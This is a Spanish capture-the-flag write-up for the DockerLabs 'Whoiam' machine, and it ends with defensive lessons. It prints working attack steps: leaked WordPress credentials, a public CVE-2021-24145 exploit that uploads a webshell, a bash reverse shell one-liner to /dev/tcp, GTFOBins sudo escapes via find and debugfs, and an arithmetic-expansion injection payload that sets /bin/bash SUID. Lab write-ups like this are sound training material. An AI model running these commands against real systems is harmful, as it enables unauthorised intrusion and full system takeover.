# Whoiam — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Pylon  
**Fecha de creación:** 09/06/2024  
**Técnicas:** WordPress · Backup Disclosure · WP Plugin RCE · CVE-2021-24145 · Reverse Shell · sudo abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración WordPress y backups](#2-enumeración-wordpress-y-backups)
3. [Acceso WordPress](#3-acceso-wordpress)
4. [Explotación CVE-2021-24145](#4-explotación-cve-2021-24145)
5. [Reverse Shell](#5-reverse-shell)
6. [Escalada de privilegios — usuario rafa](#6-escalada-de-privilegios--usuario-rafa)
7. [Escalada horizontal — usuario ruben](#7-escalada-horizontal--usuario-ruben)
8. [Escalada final a root](#8-escalada-final-a-root)
9. [Lección aprendida](#9-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh whoiam.tar
```

> IP asignada: `172.18.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.18.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
```

---

## 2. Enumeración WordPress y backups

Enumeramos directorios:

```bash
dirb http://172.18.0.2
```

Resultado:

```text
/backups/
/wp-admin/
/wp-content/
/wp-includes/
/xmlrpc.php
```

La aplicación utiliza WordPress.

Exploramos el directorio:

```text
http://172.18.0.2/backups/
```

Encontramos:

```text
databaseback2may.zip
```

Descargamos el archivo:

```bash
wget http://172.18.0.2/backups/databaseback2may.zip
```

Extraemos el contenido:

```bash
unzip databaseback2may.zip
```

Leemos el fichero:

```bash
cat 29DBMay
```

Resultado:

```text
developer : 2wmy3KrGDRD%RsA7Ty5n71L
```

---

## 3. Acceso WordPress

Accedemos al panel de WordPress:

```text
http://172.18.0.2/wp-login.php
```

Utilizamos las credenciales obtenidas:

```text
Usuario: developer
Contraseña: 2wmy3KrGDRD%RsA7Ty5n71L
```

Dentro del panel observamos el plugin:

```text
Modern Events Calendar Lite
```

---

## 4. Explotación CVE-2021-24145

Buscando vulnerabilidades encontramos:

```text
CVE-2021-24145
```

Repositorio utilizado:

[Exploit CVE-2021-24145](https://github.com/dnr6419/CVE-2021-24145?utm_source=chatgpt.com)

Clonamos el exploit:

```bash
git clone https://github.com/dnr6419/CVE-2021-24145.git
```

Mostramos ayuda:

```bash
python3 poc.py -h
```

Ejecutamos el exploit:

```bash
python3 poc.py \
-I 172.18.0.2 \
-p 80 \
-u developer \
-P '2wmy3KrGDRD%RsA7Ty5n71L'
```

Resultado:

```text
Authentication successful!
Shell Uploaded to: http://172.18.0.2:80/wp-content/uploads/shell.php
```

---

## 5. Reverse Shell

Accedemos a la WebShell interactiva.

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash:

```bash
bash -c 'bash -i >& /dev/tcp/172.18.0.1/443 0>&1'
```

Obtenemos acceso:

```bash
whoami
www-data
```

---

## 6. Escalada de privilegios — usuario rafa

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(rafa) NOPASSWD: /usr/bin/find
```

Consultamos GTFOBins y ejecutamos:

```bash
sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
```

Verificamos usuario:

```bash
whoami
rafa
```

---

## 7. Escalada horizontal — usuario ruben

Comprobamos nuevamente permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(ruben) NOPASSWD: /usr/sbin/debugfs
```

Consultamos GTFOBins:

```bash
sudo -u ruben /usr/sbin/debugfs
```

Dentro de debugfs ejecutamos:

```bash
!/bin/sh
```

Verificamos usuario:

```bash
whoami
ruben
```

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /bin/bash /opt/penguin.sh
```

---

## 8. Escalada final a root

Leemos el script:

```bash
cat /opt/penguin.sh
```

Contenido:

```bash
#!/bin/bash

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
    echo "Correct"
else
    echo "Wrong"
fi
```

Aprovechamos la expansión aritmética para ejecutar comandos:

```bash
sudo /bin/bash /opt/penguin.sh
```

Payload introducido:

```bash
test[$(chmod u+s /bin/bash)]
```

Verificamos permisos:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 9. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Backup accesible públicamente | Filtración de credenciales |
| Plugin vulnerable WordPress | Ejecución remota de código |
| WebShell PHP | Acceso inicial |
| sudo sobre find/debugfs | Escalada horizontal |
| Script Bash vulnerable | Escalada final a root |

**Para defenderse:**

- Restringir acceso a backups sensibles.
- Mantener plugins WordPress actualizados.
- Eliminar WebShells y archivos maliciosos.
- Limitar permisos sudo innecesarios.
- Validar correctamente entradas en scripts Bash.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
